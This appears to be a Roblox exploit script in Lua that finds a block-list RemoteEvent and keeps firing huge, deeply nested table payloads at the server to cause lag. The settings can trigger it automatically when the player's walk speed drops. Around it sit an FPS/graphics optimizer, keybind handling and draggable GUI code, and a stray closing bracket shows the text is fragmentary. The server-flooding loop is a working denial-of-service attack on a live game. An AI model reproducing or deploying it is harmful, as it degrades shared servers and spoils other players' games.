local function keycode(name)
    local ok, value = pcall(function() return Enum.KeyCode[name] end)
    return ok and value or nil
end
local function isGamepad(key)
    local name = key.Name
    return name:sub(1, 6) == "Button" or name:sub(1, 10) == "Thumbstick" or name:sub(1, 4) == "DPad"
end
local function finite(n)
    return type(n) == "number" and n == n and n > -math.huge and n < math.huge
end
local function setModePower(value)
    if not finite(value) then return false end
    value = math.clamp(math.floor(value), 1, 1000000000)
    config.modePowers[config.mode] = value
    config.power = value
    return true
end
local function selectPowerMode(mode)
    if config.modePowers[mode] == nil then return false end
    config.mode = mode
    config.power = config.modePowers[mode]
    return true
end
local function normalizeGUISize(value)
    if type(value) == "string" then value = value:gsub("%%", "") end
    local n = tonumber(value)
    if not finite(n) then return nil end
    return math.clamp(math.floor(n + 0.5), 50, 150)
end
local function load()
    if type(readfile) ~= "function" then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(FILE)) end)
    if not ok or type(data) ~= "table" then return end
    if finite(data.power) then config.power = math.clamp(math.floor(data.power), 1, 1000000000) end
    if type(data.mode) == "string" and defaults.modePowers[data.mode] then config.mode = data.mode end
    if type(data.modePowers) == "table" then
        for mode in pairs(defaults.modePowers) do
            local value = data.modePowers[mode]
            if finite(value) then config.modePowers[mode] = math.clamp(math.floor(value), 1, 1000000000) end
        end
    elseif finite(data.power) then
        config.modePowers[config.mode] = config.power
    end
    config.power = config.modePowers[config.mode]
    if finite(data.interval) then config.interval = math.clamp(data.interval, 0.01, 60) end
    if finite(data.background) then config.background = math.clamp(math.floor(data.background), 1, 4) end
    if finite(data.opacity) then config.opacity = math.clamp(math.floor(data.opacity), 0, 100) end
    if finite(data.guiTransparency) then
        config.guiTransparency = math.clamp(math.floor(data.guiTransparency), 0, 90)
    end
    config.guiSize = normalizeGUISize(data.guiSize) or defaults.guiSize
    if type(data.autoBrainrot) == "boolean" then config.autoBrainrot = data.autoBrainrot end
    if type(data.fpsBoost) == "boolean" then config.fpsBoost = data.fpsBoost end
    if type(data.ultraAntiLag) == "boolean" then config.ultraAntiLag = data.ultraAntiLag end
    if data.keyboard == "None" then config.keyboard = "None" end
    if data.controller == "None" then config.controller = "None" end
    local kb, gp = keycode(data.keyboard), keycode(data.controller)
    if kb and not isGamepad(kb) and kb ~= Enum.KeyCode.Unknown
        and kb ~= Enum.KeyCode.Escape and kb ~= Enum.KeyCode.LeftControl then config.keyboard = kb.Name end
    if gp and isGamepad(gp) then config.controller = gp.Name end
end

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, c in ipairs(rrs:GetChildren()) do
        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
    end
    return nil
end
local function buildPayload(power)
    local payload = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local node = {}
        table.insert(current, node)
        current = node
    end
    local repetitions = math.min(math.floor(power / 188), 10000)
    for _ = 1, repetitions do table.insert(payload, nested) end
    return payload
end
local function runPingLoop()
    pingGeneration = pingGeneration + 1
    local generation = pingGeneration
    local configured = config.interval
    local delay = configured
    while active and generation == pingGeneration and remote do
        if config.interval ~= configured then
            configured = config.interval
            delay = configured
        end
        local ok = pcall(function() remote:FireServer(buildPayload(config.power)) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function createGraphicsOptimizer()
    local Lighting = game:GetService("Lighting")
    local World = game:GetService("Workspace")
    local module = {fps = false, ultra = false, closed = false, generation = 0}
    local snapshots, sceneConnection, lightConnection = {}, nil, nil
    local savedCap, capChanged
    local function remember(object, property, value)
        local properties = snapshots[object]
        if not properties then properties = {}; snapshots[object] = properties end
        if properties[property] == nil then
            local ok, original = pcall(function() return object[property] end)
            if not ok then return end
            properties[property] = {value = original}
        end
        pcall(function() object[property] = value end)
    end
    local function restore()
        for object, properties in pairs(snapshots) do
            if properties.Parent then pcall(function() object.Parent = properties.Parent.value end) end
        end
        for object, properties in pairs(snapshots) do
            for property, data in pairs(properties) do
                if property ~= "Parent" then pcall(function() object[property] = data.value end) end
            end
        end
        snapshots = {}
    end
    local function skipFPS(object)
        local current = object
        while current do
            local name = current.Name:lower()
            if name == "laser" or name == "laserhitbox"
                or name == "flowerskin_katanarealistic" or name == "flowerskin_assetkatana"
                or name == "customunionvisual" then return true end
            if current:IsA("Tool") or current:IsA("Accessory") or current:IsA("Accoutrement") then return true end
            if current:IsA("Model") and (current:FindFirstChildOfClass("Humanoid")
                or Players:GetPlayerFromCharacter(current)) then return true end
            if current:GetAttribute("CursedBatSkinsGenerated") == true
                or current:GetAttribute("CursedBatSkinsExactMesh") == true then return true end
            current = current.Parent
        end
        return false
    end
    local function particle(object)
        return object:IsA("ParticleEmitter") or object:IsA("Beam") or object:IsA("Trail")
            or object:IsA("Fire") or object:IsA("Smoke") or object:IsA("Sparkles")
    end
    local function postEffect(object)
        return object:IsA("BlurEffect") or object:IsA("SunRaysEffect")
            or object:IsA("ColorCorrectionEffect") or object:IsA("BloomEffect")
            or object:IsA("DepthOfFieldEffect")
    end
    local function stopAnimations(object)
        pcall(function()
            for _, track in ipairs(object:GetPlayingAnimationTracks()) do track:Stop(0) end
        end)
    end
    local function applyObject(object)
        if module.closed then return end
        local useFPS = module.fps and not skipFPS(object)
        if module.ultra and not object:IsA("Accessory") and not object:IsA("Hat") then
            if object:IsA("BasePart") then
                remember(object, "Material", Enum.Material.Plastic)
                remember(object, "Reflectance", 0)
                remember(object, "CastShadow", false)
            elseif object:IsA("Decal") or object:IsA("Texture") then
                remember(object, "Transparency", 1)
            elseif particle(object) then
                remember(object, "Enabled", false)
            elseif object:IsA("Animator") or object:IsA("AnimationController") then
                stopAnimations(object)
            end
        end
        if not useFPS then return end
        if particle(object) then
            remember(object, "Enabled", false)
            remember(object, "Parent", nil)
        elseif object:IsA("Animator") then
            stopAnimations(object)
        elseif object:IsA("Texture") or object:IsA("Decal") or object:IsA("ImageLabel")
            or object:IsA("ImageButton") or object:IsA("SurfaceAppearance") or object:IsA("BlockMesh")
            or object:IsA("SelectionBox") or object:IsA("SelectionSphere") then
            remember(object, "Parent", nil)
        elseif object:IsA("SpecialMesh") then
            remember(object, "TextureId", "")
            remember(object, "Parent", nil)
        elseif object:IsA("BillboardGui") then
            local name = object.Name:lower()
            if name ~= "overhead" and name ~= "trublogh" and name ~= "yourbase" and not name:find("esp") then
                remember(object, "Parent", nil)
            end
        elseif object:IsA("SurfaceGui") then
            if not object.Parent or object.Parent.Name ~= "PlotSign" then remember(object, "Parent", nil) end
        elseif object:IsA("BasePart") then
            remember(object, "Material", Enum.Material.Plastic)
            remember(object, "CastShadow", false)
            remember(object, "Reflectance", 0)
            remember(object, "RenderFidelity", Enum.RenderFidelity.Automatic)
        elseif object:IsA("PointLight") or object:IsA("SpotLight") or object:IsA("SurfaceLight") then
            remember(object, "Enabled", false)
        end
    end
    local function applyLightObject(object)
        if module.fps and (postEffect(object) or object:IsA("Atmosphere") or object:IsA("Sky")) then
            remember(object, "Parent", nil)
        elseif module.ultra and postEffect(object) then
            remember(object, "Enabled", false)
        end
    end
    local function disconnectWatchers()
        if sceneConnection then sceneConnection:Disconnect(); sceneConnection = nil end
        if lightConnection then lightConnection:Disconnect(); lightConnection = nil end
    end
    function module.set(fps, ultra)
        if module.closed then return end
        fps, ultra = fps == true, ultra == true
        if module.fps == fps and module.ultra == ultra then return end
        module.generation = module.generation + 1
        local generation = module.generation
        disconnectWatchers()
        restore()
        if capChanged and not fps then
            pcall(function() setfpscap(savedCap) end)
            savedCap, capChanged = nil, false
        end
        if fps and not capChanged and type(setfpscap) == "function" then
            savedCap = 60
            if type(getfpscap) == "function" then
                local ok, cap = pcall(getfpscap)
                if ok and finite(cap) and cap > 0 then savedCap = cap end
            end
            local ok = pcall(setfpscap, 9999999)
            capChanged = ok
        end
        module.fps, module.ultra = fps, ultra
        if not fps and not ultra then return end
        if fps then
            remember(Lighting, "GlobalShadows", false)
            remember(Lighting, "Brightness", 2)
            remember(Lighting, "Ambient", Color3.fromRGB(178, 178, 178))
            remember(Lighting, "OutdoorAmbient", Color3.fromRGB(178, 178, 178))
            remember(Lighting, "FogEnd", 100000)
            remember(Lighting, "FogStart", 100000)
        end
        if ultra then
            remember(Lighting, "GlobalShadows", false)
            remember(Lighting, "FogEnd", 1e10)
            remember(Lighting, "Brightness", 0)
        end
        for _, object in ipairs(Lighting:GetChildren()) do pcall(applyLightObject, object) end
        sceneConnection = World.DescendantAdded:Connect(function(object)
            task.defer(function()
                if not module.closed and generation == module.generation then pcall(applyObject, object) end
            end)
        end)
        lightConnection = Lighting.ChildAdded:Connect(function(object)
            task.defer(function()
                if not module.closed and generation == module.generation then pcall(applyLightObject, object) end
            end)
        end)
        task.spawn(function()
            for i, object in ipairs(World:GetDescendants()) do
                if module.closed or generation ~= module.generation then return end
                pcall(applyObject, object)
                if i % 350 == 0 then task.wait() end
            end
        end)
    end
    function module.close()
        if module.closed then return end
        module.set(false, false)
        module.generation = module.generation + 1
        module.closed = true
        disconnectWatchers()
        restore()
    end
    return module
end

local function clampFrame(frame)

    if view.X < 1 or view.Y < 1 then return end
    local scale = frame == main and mainScale.Scale or settingsScale.Scale
    local width, height = frame.Size.X.Offset * scale, frame.Size.Y.Offset * scale
    local p = frame.Position
    local x = p.X.Scale * view.X + p.X.Offset
    local y = p.Y.Scale * view.Y + p.Y.Offset
    frame.Position = UDim2.fromOffset(math.clamp(x, 0, math.max(0, view.X - width)),
        math.clamp(y, 0, math.max(0, view.Y - height)))
end

local function flipLag(state, isManual)
    if isManual then manualOverride = brainrotMode and not state end
    if state and not remote then remote = findRemote() end
    if state and not remote then state = false end
    local changed = state ~= active
    if changed then
        active = state
        if not active then pingGeneration = pingGeneration + 1 end
    end
    renderActivation()
    if changed and active then task.spawn(runPingLoop) end
end

local function bindSlider(track, field, maximum)
    local dragging, touch
    local function slideAt(x)
        local width = track.AbsoluteSize.X
        if width <= 0 then return end
        local fraction = math.clamp((x - track.AbsolutePosition.X) / width, 0, 1)
        config[field] = math.floor(fraction * maximum + 0.5)
        refresh()
    end
    connect(track.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            touch = input.UserInputType == Enum.UserInputType.Touch and input or nil
            slideAt(input.Position.X)
        end
    end)
    connect(UIS.InputChanged, function(input)
        if dragging and (input == touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
            slideAt(input.Position.X)
        end
    end)
    connect(UIS.InputEnded, function(input)
        if dragging and (input == touch or input.UserInputType == Enum.UserInputType.MouseButton1) then
            dragging = false
            save()
        end
    end)
end

local function updateDetection()
    if not config.autoBrainrot then
        brainrotMode, manualOverride, lastBrainrotState = false, false, false
        detectorLabel.Text = "AUTO OFF  /  MANUAL"
        return
    end
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        if lastBrainrotState then
            brainrotMode, manualOverride, lastBrainrotState = false, false, false
            flipLag(false)
        end
        detectorLabel.Text = "AUTO / WAITING"
        return
    end
    local hasBrainrot = humanoid.WalkSpeed < 25
    if hasBrainrot ~= lastBrainrotState then
        lastBrainrotState = hasBrainrot
        brainrotMode = hasBrainrot
        manualOverride = false
        if hasBrainrot and not remote then remote = findRemote() end
        flipLag(hasBrainrot)
    elseif hasBrainrot and brainrotMode and not active and not manualOverride then
        if not remote then remote = findRemote() end
        if remote then flipLag(true) end
    end
    if hasBrainrot then
        detectorLabel.Text = remote and "AUTO / DETECTED" or "AUTO / NO REMOTE"
    else
        detectorLabel.Text = "AUTO / MONITORING"
    end
end

connect(UIS.InputBegan, function(input, processed)
    if UIS:GetFocusedTextBox() then return end
    local key = input.KeyCode
    local kb = input.UserInputType == Enum.UserInputType.Keyboard
    local gp = input.UserInputType.Name:sub(1, 7) == "Gamepad"
    if strengthPicker.Visible then
        if key == Enum.KeyCode.Escape or (gp and key == Enum.KeyCode.ButtonB) then
            strengthPicker.Visible = false
        elseif key == Enum.KeyCode.LeftControl then
            setVisible(not main.Visible)
        end
        return
    end
    if listening then
        if key == Enum.KeyCode.Escape then listening = nil; refresh(); return end
        if listening == "keyboard" and kb and key ~= Enum.KeyCode.Unknown and key ~= Enum.KeyCode.LeftControl then
            config.keyboard = key.Name
        elseif listening == "controller" and gp and isGamepad(key) then config.controller = key.Name
        else return end
        listening = nil
        save()
        refresh()
        return
    end
    if processed then return end
    if key == Enum.KeyCode.LeftControl then setVisible(not main.Visible); return end
    if (kb and key == keycode(config.keyboard)) or (gp and key == keycode(config.controller)) then
        flipLag(not active, true)
    end
end)

local dragFrame, dragStart, dragPosition, dragTouch
local function draggable(header, frame)
    connect(header.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragFrame, dragStart, dragPosition = frame, input.Position, frame.Position
            dragTouch = input.UserInputType == Enum.UserInputType.Touch and input or nil
        end
    end)
end

end)
connect(UIS.InputChanged, function(input)
    if not dragFrame then return end
    if input.UserInputType ~= Enum.UserInputType.MouseMovement and input ~= dragTouch then return end
    local delta = input.Position - dragStart
    dragFrame.Position = UDim2.new(dragPosition.X.Scale, dragPosition.X.Offset + delta.X,
        dragPosition.Y.Scale, dragPosition.Y.Offset + delta.Y)
    clampFrame(dragFrame)
end)
